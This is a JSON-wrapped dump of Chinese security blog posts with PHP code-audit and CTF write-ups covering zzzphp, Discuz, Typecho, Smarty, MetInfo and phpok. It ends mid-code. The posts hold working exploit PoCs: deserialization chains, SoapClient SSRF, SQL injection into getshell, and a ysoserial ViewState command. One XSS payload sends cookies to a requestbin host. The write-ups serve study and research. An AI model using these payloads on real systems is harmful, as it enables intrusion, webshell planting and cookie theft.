https://xz.aliyun.com/t/7457","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"zzzphp<=1.7.3后台文件上传getshell","slug":"zzzphp-1-7-3后台文件上传getshell","date":"2020-03-31T17:09:49.000Z","updated":"2020-04-01T03:19:18.784Z","comments":true,"path":"2020/04/01/zzzphp-1-7-3后台文件上传getshell/","link":"","permalink":"https://glotozz.github.io/2020/04/01/zzzphp-1-7-3%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 环境搭建 漏洞分析 漏洞复现 总结 参考链接 环境搭建漏洞影响：&lt;=zzzphp_v1.7.3 搭建了v_1.7.0的版本 漏洞分析inc/zzz_file.php 自定义上传目录，跟进upload() 传入type可以自定义后缀白名单 这里可以设置黑名单外的后缀，本来可以利用后缀phtml，某些环境默认是解析的，比如我kali的apache2，但是这里长度限制为4，包括.htaccess和.user.ini也被限制了。遂作罢 假如服务器无法解析，限制了上传白名单pdf，zip，图片。可以考虑从自解压入手。既然存在上传压缩文件，一般都存在解压函数。 全局搜索unzip admin771/save.php 跟进getfiles() 根据注释，遍历获取目录下的指定类型的文件，然后解压保存至$savepath 那么我们可以把之前的zip上传到这个文件夹下runtime/zip 漏洞复现admin771/save.php?act=upload 解压到runtime/updata/下 访问a.php 总结又学到一种新的组合利用链。 参考链接 https://xz.aliyun.com/t/6916","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"Discuz! X3.4后台sql注入","slug":"Discuz-X3-4后台sql注入","date":"2020-03-31T03:06:02.000Z","updated":"2020-04-01T12:39:58.009Z","comments":true,"path":"2020/03/31/Discuz-X3-4后台sql注入/","link":"","permalink":"https://glotozz.github.io/2020/03/31/Discuz-X3-4%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 环境搭建 漏洞分析 漏洞复现 漏洞修复 总结 参考链接 环境搭建影响版本： Discuz! X系列全版本 截止到 Discuz! X3.4 R20191201 UTF-8 https://www.discuz.net/thread-3847642-1-1.html 漏洞分析uc_client/model/base.php 跟进init_note() 跟进note_exist() 跟进这个UC_APPID来自配置文件，而从php文件中取出字符是没有转义的（和二次注入同理） 全局搜索设置的地方UC_APPID，或者config_ucenter.php source/admincp/admincp_setting.php 1$settingnew &#x3D; $_GET[&#39;settingnew&#39;]; 经过addslashes()处理 登录后台即可修改配置 漏洞复现前端 路由 admin.php GET传入action，跟进admincpfile() 访问admin.php?action=setting+POST传参 漏洞修复gitee中的修复 增加了几处对UC_APPID判断 总结通过读取配置文件进行二次注入也是一种思路。 参考链接 https://xz.aliyun.com/t/6927","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"Ezpop_Revenge-wp","slug":"Ezpop-Revenge-wp","date":"2020-03-29T04:39:49.000Z","updated":"2020-04-01T12:36:51.787Z","comments":true,"path":"2020/03/29/Ezpop-Revenge-wp/","link":"","permalink":"https://glotozz.github.io/2020/03/29/Ezpop-Revenge-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 简单分析 思路一 思路二 下午看队里师傅们在讨论这题，于是也来划划水。 www.zip源码泄露，Typecho框架，只记得有个远古时期反序列化漏洞 这类blog类型的框架的漏洞很多出现在插件或主题中，这里看了下目录结构，找到了入口 简单分析var/Typecho/Plugin.php 激活插件方法处得到绑定的url usr/plugins/HelloWorld/Plugin.php 反序列化触发点 反序列化入口类 跟进 第一处字符串拼接触发__toString() 第二处可以调用任意类的任意方法，以及触发__call() 既然能触发__toString()，那么第一个思路就开始了，其实就是远古的那条POP链，原理不在赘述。 第二个思路应该是预期解，就是利用SSRF带个sessionid，再次访问会var_dump() 思路一历史漏洞的POP链 var/Typecho/Feed.php-&gt;__toString()-&gt;$item[&#39;author&#39;]-&gt;screenName var/Typecho/Request.php-&gt;__get()-&gt;get()-&gt;_applyFilter-&gt;call_user_func() POC编写 1234567891011121314151617181920212223242526272829&lt;?phpclass Typecho_Request&#123; private $_params = []; private $filter = []; function __construct()&#123; $this-&gt;_params = ['screenName'=&gt;'1']; $this-&gt;filter = ['phpinfo']; &#125;&#125;class Typecho_Feed&#123; private $_items = []; private $_type; const RSS2 = 'RSS 2.0'; function __construct()&#123; $this-&gt;_items = ['author'=&gt;new Typecho_Request,'category'=&gt;[new Typecho_Request]];//注意点 $this-&gt;_type = self::RSS2; &#125;&#125;class HelloWorld_DB&#123; private $coincidence = []; function __construct()&#123; $this-&gt;coincidence = ['hello'=&gt;new Typecho_Feed,'world'=&gt;'gqy']; &#125;&#125;echo base64_encode(serialize(new HelloWorld_DB)); 这里的category是为了让程序报错，从而程序强制停止，那么缓冲区的数据会输出出来。当时有个ob_start()但是这里没有ob_start()，尝试其他的办法也无果，应该是新版本修复了漏洞，如何修复的没有继续深究。 Fatal error: Method Typecho_Feed::__toString() must not throw an exception, caught Error: Cannot use object of type Typecho_Request as array PS:那个过滤是不是0day x) 思路二var/Typecho/Db/Query.php 这里明显可以触发__call()，配合SoapClient进行SSRF POC编写 123456789101112131415161718192021222324252627282930313233&lt;?phpclass Typecho_Db_Query&#123; private $_adapter; private $_sqlPreBuild; function __construct()&#123; // $target = 'http://118.178.88.46:1234'; $target = 'http://127.0.0.1/flag.php'; $post_string = 'gqy=1'. \"\\r\\n\"; $headers = array( 'Cookie: PHPSESSID=glotozz', // 'X-Forwarded-For: 127.0.0.1' ); $b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' =&gt; \"aaab\")); $aaa = serialize($b); $aaa = str_replace('^^',\"\\r\\n\",$aaa); $aaa = str_replace('&amp;','&amp;',$aaa); $c = unserialize($aaa); // $c-&gt;notexist(); // var_dump($c); $this-&gt;_adapter = $c; $this-&gt;_sqlPreBuild = ['action'=&gt;'SELECT']; &#125;&#125;class HelloWorld_DB&#123; private $coincidence = []; function __construct()&#123; $this-&gt;coincidence = ['hello'=&gt;new Typecho_Db_Query,'world'=&gt;'gqy']; &#125;&#125;echo base64_encode(serialize(new HelloWorld_DB)); 修改Cookie，PHPSESSID设置成glotozz再次访问","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"Smarty<=3.1.31 RCE","slug":"Smarty-3-1-31-RCE","date":"2020-03-26T03:21:11.000Z","updated":"2020-03-26T07:50:20.043Z","comments":true,"path":"2020/03/26/Smarty-3-1-31-RCE/","link":"","permalink":"https://glotozz.github.io/2020/03/26/Smarty-3-1-31-RCE/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 环境搭建 漏洞分析 漏洞复现 总结 参考链接 环境搭建 https://www.smarty.net/ 漏洞影响Smarty&lt;=3.1.31、3.1.32-dev 需要控制文件名变量 漏洞分析修改下index.php 123456789101112131415161718192021222324252627282930&lt;?php/** * Example Application * * @package Example-application */define('SMARTY_ROOT_DIR', str_replace('\\\\', '/', __DIR__));define('SMARTY_COMPILE_DIR', SMARTY_ROOT_DIR.'/tmp/templates_c');define('SMARTY_CACHE_DIR', SMARTY_ROOT_DIR.'/tmp/cache');require '../libs/Smarty.class.php';class testSmarty extends Smarty_Resource_Custom&#123; protected function fetch($name, &amp;$source, &amp;$mtime) &#123; $template = \"CVE-2017-1000480 smarty PHP code injection\"; $source = $template; $mtime = time(); &#125;&#125;$smarty = new Smarty();$smarty-&gt;setCacheDir(SMARTY_CACHE_DIR);$smarty-&gt;setCompileDir(SMARTY_COMPILE_DIR);$smarty-&gt;registerResource('test', new testSmarty);$smarty-&gt;display('test:'.$_GET['eval']);?&gt; 跟进display() 跟进_execute() 1$result &#x3D; $template-&gt;render(false, $function); 主要是创建模版并进入渲染函数 跟进render() 之前没有生成模版缓存文件，这里会继续进入render() 跟进process() 先跟进compileTemplateSource() 跟进compileTemplate() 跟进create() 可以看到这里拼接上了filepath，这里前后有/*和*/，可以*/phpinfo();/*绕过 但是我们还要解决访问缓存文件， 跟进之前的loadCompiledTemplate() 发现存在文件包含，因此之前的缓存文件被包含了 漏洞复现 在win平台下，文件名中不允许有*，而smarty框架的生成的编译文件的名字会含有我们的payload，所以在win下时会直接提示创建文件失败。 总结用户控制参数写入模版文件也是容易出现漏洞的地方。 参考链接 https://xz.aliyun.com/t/1983 https://www.cnblogs.com/magic-zero/p/8351974.html","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"RIPS 2017 PHP代码安全审计挑战wp","slug":"RIPS-2017-PHP代码安全审计挑战wp","date":"2020-03-26T00:53:57.000Z","updated":"2020-03-26T06:36:51.628Z","comments":true,"path":"2020/03/26/RIPS-2017-PHP代码安全审计挑战wp/","link":"","permalink":"https://glotozz.github.io/2020/03/26/RIPS-2017-PHP%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E6%8C%91%E6%88%98wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 Day 1 - Wish List Day 2 - Twig Day 3 - Snow Flake Day 4 - False Beard Day 6 - Frost Pattern Day 7 - Bells Day 8 - Candle Day 10 - Anticipation Day 11 - Pumpkin Pie Day 12 - String Lights Day 13 - Turkey Baster Day 14 - Snowman Day 15 - Sleigh Ride Day 16 - Poem Day 17 - Mistletoe Day 18 - Sign Day 19 - Birch Day 21 - Gift Wrap Day 23 - Cookies 参考链接 虽然是2017年的，但是内容还是很有意义的。这里挑几个记录一下 Day 1 - Wish List123456789101112131415161718192021class Challenge &#123; const UPLOAD_DIRECTORY = './solutions/'; private $file; private $whitelist; public function __construct($file) &#123; $this-&gt;file = $file; $this-&gt;whitelist = range(1, 24); &#125; public function __destruct() &#123; if (in_array($this-&gt;file['name'], $this-&gt;whitelist)) &#123; move_uploaded_file( $this-&gt;file['tmp'], self::UPLOAD_DIRECTORY . $this-&gt;file['name'] ); &#125; &#125;&#125;$challenge = new Challenge($_FILES['solution']); 漏洞点在in_array()函数， 1bool in_array ( mixed $needle , array $haystack [, bool $strict &#x3D; FALSE ] ) 默认第三个参数是FALSE， 如果该参数设置为 TRUE，则in_array()函数检查搜索的数据与数组的值的类型是否相同。 这里的白名单为数字，因此php在判断时会将$this-&gt;file[&#39;name&#39;]自动转换为整数，因此可以5gqy.php绕过 Day 2 - Twig123456789101112131415161718192021222324252627282930313233// composer require \"twig/twig\"require 'vendor/autoload.php';class Template &#123; private $twig; public function __construct() &#123; $indexTemplate = '&lt;img ' . 'src=\"https://loremflickr.com/320/240\"&gt;' . '&lt;a href=\"&#123;&#123;link|escape&#125;&#125;\"&gt;Next slide »&lt;/a&gt;'; // Default twig setup, simulate loading // index.html file from disk $loader = new Twig\\Loader\\ArrayLoader([ 'index.html' =&gt; $indexTemplate ]); $this-&gt;twig = new Twig\\Environment($loader); &#125; public function getNexSlideUrl() &#123; $nextSlide = $_GET['nextSlide']; return filter_var($nextSlide, FILTER_VALIDATE_URL); &#125; public function render() &#123; echo $this-&gt;twig-&gt;render( 'index.html', ['link' =&gt; $this-&gt;getNexSlideUrl()] ); &#125;&#125;(new Template())-&gt;render(); filter_var($nextSlide, FILTER_VALIDATE_URL); 只是形式上的检查a://b，因此可以javascript:// Twig的 1&#123;&#123;link|escape&#125;&#125; 和PHP中的htmlspecialchars($link, ENT_QUOTES, &#39;UTF-8&#39;)类似，所以单引号和双引号等都无法使用。 在javascript中//表示注释，可以利用换行符绕过%0a，由于先经过php再进入模版，%需要转义， Payload为javascript://%250a Day 3 - Snow Flake1234567891011121314151617181920212223242526272829function __autoload($className) &#123; include $className;&#125;$controllerName = $_GET['c'];$data = $_GET['d'];if (class_exists($controllerName)) &#123; $controller = new $controllerName($data); $controller-&gt;render();&#125; else &#123; echo 'There is no page with this name';&#125;class HomeController &#123; private $data; public function __construct($data) &#123; $this-&gt;data = $data; &#125; public function render() &#123; if ($this-&gt;data['new']) &#123; echo 'controller rendering new response'; &#125; else &#123; echo 'controller rendering old response'; &#125; &#125;&#125; 主要就是__autoload() 尝试加载未定义的类 从PHP 7.2.0 开始，此功能已被 弃用。强烈建议不要使用此功能。 这里的class_exists()会触发__autoload()，本题中可以任意文件包含 还有另一种思路，就是实例化一个内置类， SimpleXMLElement类来完成XXE攻击 Day 4 - False Beard1234567891011121314151617181920class Login &#123; public function __construct($user, $pass) &#123; $this-&gt;loginViaXml($user, $pass); &#125; public function loginViaXml($user, $pass) &#123; if ( (!strpos($user, '&lt;') || !strpos($user, '&gt;')) &amp;&amp; (!strpos($pass, '&lt;') || !strpos($pass, '&gt;')) ) &#123; $format = '&lt;xml&gt;&lt;user=\"%s\"/&gt;&lt;pass=\"%s\"/&gt;&lt;/xml&gt;'; $xml = sprintf($format, $user, $pass); $xmlElement = new SimpleXMLElement($xml); // Perform the actual login. $this-&gt;login($xmlElement); &#125; &#125;&#125;new Login($_POST['username'], $_POST['password']); 本意是禁止出现&lt;和&gt; 12var_dump(strpos(&#39;abcd&#39;,&#39;a&#39;)); # 0var_dump(strpos(&#39;abcd&#39;,&#39;x&#39;)); # false 由于php自动类型转换0==false，因此只要第一位是&lt;即可绕过判断 Day 6 - Frost Pattern123456789101112131415161718192021222324252627class TokenStorage &#123; public function performAction($action, $data) &#123; switch ($action) &#123; case 'create': $this-&gt;createToken($data); break; case 'delete': $this-&gt;clearToken($data); break; default: throw new Exception('Unknown action'); &#125; &#125; public function createToken($seed) &#123; $token = md5($seed); file_put_contents('/tmp/tokens/' . $token, '...data'); &#125; public function clearToken($token) &#123; $file = preg_replace(\"/[^a-z.-_]/\", \"\", $token); unlink('/tmp/tokens/' . $file); &#125;&#125;$storage = new TokenStorage();$storage-&gt;performAction($_GET['action'], $_GET['data']); 本意是，是将非a-z . - _ 全部替换为空 本题的问题在于[^a-z.-_]中的-没有进行转义，表示的是非a-z .-_ Day 7 - Bellsparse_str()的参数可控导致变量覆盖 Day 8 - Candlepreg_replace(&#39;/e&#39;,&#39;&#39;)导致代码执行 Day 10 - Anticipationheader()进行跳转代码继续执行 Day 11 - Pumpkin PiePHP中的反序列化的一个BUG，只需要在对象长度前添加一个+号，即o:14-&gt;o:+14，这样就可以绕过正则匹配。 Day 12 - String Lights$sanitized[$key] = intval($value); 只对$value进行了过滤 Day 13 - Turkey Baster123456789function sanitizeInput($input, $length = 20) &#123; $input = addslashes($input); if (strlen($input) &gt; $length) &#123; $input = substr($input, 0, $length); &#125; return $input;&#125;$test = \"1234567890123456789'\";var_dump(sanitizeInput($test)); 利用长度截断将addslashes()添加的\\逃逸出来，转义原本闭合的单引号 类似的还有一种是插入admin+50个0+1，由于截断插入admin+50个0，在where name=&#39;admin&#39;的时候成功登录admin Day 14 - Snowman12echo $test++; //无效果echo ++$test; //隐式类型转换+最后一个字符加法操作 var_export(get_object_vars($this), true)不会进行转义 Day 15 - Sleigh Ride存在$url = urldecode($url);，二次编码绕过 Day 16 - Poem从$_REQUEST变量直接引用，可能会忘记过滤，记得有个历史漏洞就是利用这个。 还有就是&#39;1a&#39;==1 Day 17 - Mistletoe12var_dump(md5('1')); # c4ca4238a0b923820dcc509a6f75849bvar_dump(md5('1',True)); # ��B8��#��P�ou�� Day 18 - Signopenssl_verify() Returns 1 if the signature is correct, 0 if it is incorrect, and -1 on error 如果判断不是if(openssl_verify()===1)，就有可能利用-1绕过 if()只有遇到0或者false才返回false Day 19 - Birch stripcslashes函数 返回反转义后的字符串。可识别类似 C 语言的 \\n，\\r，… 八进制以及十六进制的描述。 因此可以利用8进制绕过 Day 21 - Gift Wrap array_walk()的一个bug。php是一个弱类型的语言，在传入参数时并不会进行类型检查，甚至有时候还会进行隐式类型转换 在php7中就引入了declare(strict_types=1); 通过array_walk()调用的函数会忽略掉严格模式还是按照之前的php的类型转换的方式调用函数 Day 23 - Cookiesldap_escape($user, null, LDAP_ESCAPE_DN) The context the escaped string will be used in: LDAP_ESCAPE_FILTER for filters to be used with ldap_search(), or LDAP_ESCAPE_DN for DNs 这里选用了错误的过滤方式 参考链接 https://www.vulnspy.com/cn-ripstech-presents-php-security-calendar-2017/#M-tbRemYKdmb5mr4dRCndhHCM5YaFRaRf8","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"BJDCTF2nd-wp","slug":"BJDCTF2nd-wp","date":"2020-03-25T12:38:54.000Z","updated":"2020-03-26T03:18:34.877Z","comments":true,"path":"2020/03/25/BJDCTF2nd-wp/","link":"","permalink":"https://glotozz.github.io/2020/03/25/BJDCTF2nd-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 XSS之光 EasyAspDotNet 参考链接 选了两题补一补 XSS之光 git泄露，GitHack还原 只有一个index.php 123&lt;?php$a &#x3D; $_GET[&#39;yds_is_so_beautiful&#39;];echo unserialize($a); php原生类反序列化，当前php版本为php5.6.40 可以利用的主要有这些 __call() SoapClient类，可以触发SSRF wupco师傅的poc举例 1234567891011&lt;?php$target = \"http://example.com:5555/\";$post_string = 'data=abc';$headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93');$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string,'uri'=&gt;'hello'));$aaa = serialize($b);$aaa = str_replace('^^',\"\\n\\r\",$aaa);echo urlencode($aaa); __toString() Error类，适用于php7 Exception类，适用于php5，php7 通常用户触发XSS 123456789&lt;?phperror_reporting(0);$a = new Exception(\"&lt;script&gt;alert()&lt;/script&gt;\");$b = serialize($a);echo urlencode($b);//Test$c = urldecode('O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D');echo unserialize($c); 这题使用Exception类来触发XSS，利用window.location.href或者window.open，注意不能用bp，这时浏览器的功能 1234&lt;?php $a &#x3D; new Exception(&quot;&lt;script&gt;window.location.href&#x3D;\\&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;rklv31rk?cookie&#x3D;\\&quot;+escape(document[\\&quot;cookie\\&quot;])&lt;&#x2F;script&gt;&quot;); $a &#x3D; new Exception(&quot;&lt;script&gt;window.open(&#39;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;rklv31rk?&#39;+document.cookie);&lt;&#x2F;script&gt;&quot;); $b &#x3D; serialize($a); ============题外话，也是摘自链接 如果能实例化任何类，可以利用一些原生类，虽然还没遇到过这个场景 可获取目录DirectoryIterator XXESimpleXMLElement 创建空白文件SQLite3 EasyAspDotNetASP.NET还是第一次做，主要是复现下，原理有缘再看 存在任意文件读取，.aspx 后缀，读取web.config 有了 VIEWSTATE 的加密密钥，可以进行反序列化攻击 1ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c &quot;ExploitClass.cs;System.dll;System.Web.dll&quot; --generator&#x3D;&quot;CA0B0334&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot; decryptionKey&#x3D;&quot;B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5&quot; 12dir c:\\type c:\\Fl@g_glzjin_still_w@nts_a_girl_friend.txt 参考链接 https://www.gem-love.com/ctf/2097.html https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html https://www.zhaoj.in/read-6497.html https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"MetInfo任意文件读取漏洞的修复与绕过","slug":"MetInfo任意文件读取漏洞的修复与绕过","date":"2020-03-25T08:03:17.000Z","updated":"2020-03-31T12:50:29.333Z","comments":true,"path":"2020/03/25/MetInfo任意文件读取漏洞的修复与绕过/","link":"","permalink":"https://glotozz.github.io/2020/03/25/MetInfo%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BF%AE%E5%A4%8D%E4%B8%8E%E7%BB%95%E8%BF%87/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 漏洞分析 漏洞复现 总结 参考链接 虽然这个漏洞不复杂，这个文件包含的漏洞修复与绕过挺有意思 漏洞分析官网下载了一个V6.0.0 app/system/include/module/old_thumb.class.php 这里看到的已经是最终版本了，将../和./替换为空，并且不能有./，且需要包含http 在windows下仍然能利用 ?dir=http\\..\\..\\config\\config_db.php 最初的两个版本是替换../为空，利用....//即可绕过 替换../和./为空，利用...././/即可绕过 文章太短了，跟一下metinfo的调用 include/thumb.php app/system/entrance.php app/system/include/class/load.class.php 包含了app/system/include/module/old_thumb.class.php 漏洞复现/MetInfo6.0.0/include/thumb.php?dir=http\\..\\..\\config\\config_db.php 总结漏洞跟踪也是挖掘漏洞的一种方式，尤其是自己提交的，某种意义上挖掘起来更简单。 参考链接 https://www.freebuf.com/vuls/181698.html","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"phpok前台getshell","slug":"phpok前台getshell","date":"2020-03-24T03:08:23.000Z","updated":"2020-03-25T11:11:46.264Z","comments":true,"path":"2020/03/24/phpok前台getshell/","link":"","permalink":"https://glotozz.github.io/2020/03/24/phpok%E5%89%8D%E5%8F%B0getshell/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 phpok4.7从sql注入到getshell 漏洞分析 POC编写 phpok5.3的getshell 漏洞分析 POC编写 phpok5.4.137getshell 思路一、通过sql注入插入将要反序列化的数据 思路二、和phpok4.7一样通过sql注入添加上传附件php白名单 总结 参考链接 phpok4.7从sql注入到getshell漏洞分析/framework/www/upload_control.php 基础上传函数，传入一个表单名和存储目录，返回上传结果 其中$this-&gt;lib(&#39;upload&#39;)-&gt;getfile($input_name,$cateid)表示使用libs下的upload.php中的getfile()方法 跟进getfile() 传入了上传表单名，就会进入_upload()，继续跟进 比较长，是完整的上传操作，包括异常抛出等。 先看看一开始的后缀名检测 白名单，因此无法利用 最后如果上传成功返回一个数组$rs，其中第一个参数$title是我们传入的文件名即$tmpname，先返回到getfile()，再回到upload_base()，如果之前上传成功，会有一个数据库操作 1$id &#x3D; $this-&gt;model(&#39;res&#39;)-&gt;save($array); 跟进model/res.php的save()方法 跟进engine/db/mysqli.php的insert_array()方法 就是将数组转化为insert into语句，因为我们可控$title，因此可以insert into注入。之前自己挖的一个洞就是无逗号的insert into注入，当时利用下面的方法构造盲注 1insert into &#96;user&#96;(id,name) (select 3,4 from another_table where case when 1 then sleep(5) else 1 end) 这里可以利用下面的方法插入多条语句 1insert into file values(1,2,3),(4,5,6) 成功插入下一条语句后， 下一个利用点/framework/www/upload_control.php的replace_f() 附件上传替换方法， 传oldid去数据库寻找相关数据，将上传的附加mv到oldid对应的数据中，我们控制$rs[&quot;filename&quot;]为a.php即可。还有个注意点就是文件名不能带/，可以利用16进制的方式插入 默认是无需登录即可上传 全局搜索调用upload_base()的地方 phpok对控制器的调用如下 index.php admin.php api.php 分别对应 framework文件夹下的www admin api这三个文件夹 参数c的值再拼接上_control.php就是对应的文件 对应的类即{$c}_control 参数f的值再拼接上_f就是对应的方法 此处通过c=upload&amp;f=save的形式调用 POC编写先随便传个包然后general_log观察sql语句 1INSERT INTO qinggan_res (`cate_id`,`folder`,`name`,`ext`,`filename`,`addtime`,`title`,`session_id`,`user_id`,`attr`) VALUES('1','res/202003/24/','57622ea505269ecb.jpg','jpg','res/202003/24/57622ea505269ecb.jpg','1585034277','eval','lugppkouhj1fnf1oeiils8g091','','a:2:&#123;s:5:\"width\";N;s:6:\"height\";N;&#125;') 构造将filename改为res/gqy.php 1eval&#39;,&#39;lugppkouhj1fnf1oeiils8g091&#39;,1,&#39;&#39;),(&#39;1&#39;,&#39;&#39;,&#39;57622ea505269ecb.jpg&#39;,&#39;jpg&#39;,0x7265732f6771792e706870,&#39;1585034277&#39;,&#39;eval&#39;,&#39;lugppkouhj1fnf1oeiils8g091&#39;,1,&#39;&#39;)#.jpg 再调用replace_f()方法，注意1080 1?c&#x3D;upload&amp;f&#x3D;replace&amp;oldid&#x3D;1080 访问gqy.php phpok5.3的getshell漏洞分析POP链 全局搜索__destruct() framework/engine/cache.php 跟进save() 可以控制$file利用php伪协议绕过 反序列化触发点 framework/phpok_call.php 全局搜索unserialize(，这个文件中有很多反序列化点，这里选择_format_ext_all() 全局搜索调用_format_ext_all()，没搜到。。应该是通过动态方法调用触发的 因此从前往后看 framework/api/call_control.php的index_f() 参数可控，没有过滤，跟进phpok() 这里的$GLOBALS[&#39;app&#39;]-&gt;call-&gt;phpok($id,$ext)就是phpok_call.php::phpok() 可以调用当前类中的方法$this-&gt;mlist，且参数可控，这时候就可以利用之前的_format_ext_all() POC编写第一步 12foreach($data as $key&#x3D;&gt;$value)&#123; if($call_all &amp;&amp; $call_all[$key] &amp;&amp; $call_all[$key][&#39;is_api&#39;])&#123; 调试查看call_all发现key取m_picplayer满足条件 第二步，跟进value， $rslist[$fid] = phpok($key,$tmpValue); $GLOBALS[&#39;app&#39;]-&gt;call-&gt;phpok($id,$ext); $call_rs = array_merge($call_rs,$rs); $this-&gt;$func($call_rs,$cache_id); $value[&#39;ext&#39;] = unserialize($value[&#39;ext&#39;]); 构造，其中ext是序列化的值 12$a = ['m_picplayer'=&gt;['type_id'=&gt;'format_ext_all','x'=&gt;['form_type'=&gt;'editor','content'=&gt;'1','ext'=&gt;'xx']]];echo json_encode($a); 第三步，绕过exit 这里选择base64，当然也可以试试rot13。然后在原有的phpexit基础上添加base64代码，(这里我们为了让其成为八位，所以任意在后面加一个a)得到，这里经过serialize()，测试下为10位需要加两个a 1aaPD9waHAgcGhwaW5mbygpOz8+ POC 1234567891011&lt;?phpclass cache&#123; protected $key_id = 'php://filter/write=convert.base64-decode/resource=tmp'; protected $key_list = 'aaPD9waHAgcGhwaW5mbygpOz8+'; protected $folder = '';&#125;$x = serialize(new cache);echo $x.\"\\n\";$a = ['m_picplayer'=&gt;['type_id'=&gt;'format_ext_all','x'=&gt;['form_type'=&gt;'editor','content'=&gt;'1','ext'=&gt;$x]]];echo urlencode(json_encode($a));?&gt; 访问tmp.php phpok5.4.137getshell对v5.3的漏洞修补 V5.4.305还在framework/libs/string.php中添加了layer黑名单，替换为&lt;x&gt; 1$ra1 &#x3D; array(&#39;javascript&#39;, &#39;vbscript&#39;, &#39;expression&#39;, &#39;applet&#39;, &#39;meta&#39;, &#39;xml&#39;, &#39;blink&#39;, &#39;link&#39;, &#39;style&#39;, &#39;script&#39;, &#39;embed&#39;, &#39;object&#39;, &#39;iframe&#39;, &#39;frame&#39;, &#39;frameset&#39;, &#39;ilayer&#39;, &#39;layer&#39;, &#39;bgsound&#39;, &#39;title&#39;, &#39;base&#39;); 这里可以使用aboutus绕过，但是逗号也被替换为空。。。 链接中复现成功的是5.4.137，可以去github上下载 思路一、通过sql注入插入将要反序列化的数据漏洞分析 新版本添加的format()默认会对双引号进行转义 前面的思路不变，在framework/phpok_call.php中寻找其他的方法 发现第一行将双引号又转移回去了。跟进get_all() 跟进query() 可以执行任意sql语句 接下来寻找一处对数据库进行反序列化的操作 还是在同一处调用 POC编写 只需要稍微修改即可 12$a = ['m_picplayer'=&gt;['type_id'=&gt;'sql','sqlinfo'=&gt;'select 1','is_list'=&gt;true]];echo urlencode(json_encode($a)); 简单分析下如何构造insert into 12$project_rs = $this-&gt;model('project')-&gt;project_one($rs['site'],$rs['pid']);$flist = $this-&gt;model('module')-&gt;fields_all($project_rs['module']); 控制project表的site_id和id查询，得到moudle字段作为下一次查询的条件。 再去fields表中根据ftype查询，得到的结果中的ext即是我们要反序列化的地方 插入语句，存在%00，将反序列化的数据16进制处理下，注意第二个别选0 1insert into qinggan_fields values(1233,21,'a','a','varchar','a','text','a','safe',200,200,'ext',0,0,'','') POC 12345678910111213141516171819202122232425&lt;?phpfunction strToHex($str)&#123; $hex=\"\"; for($i = 0;$i &lt; 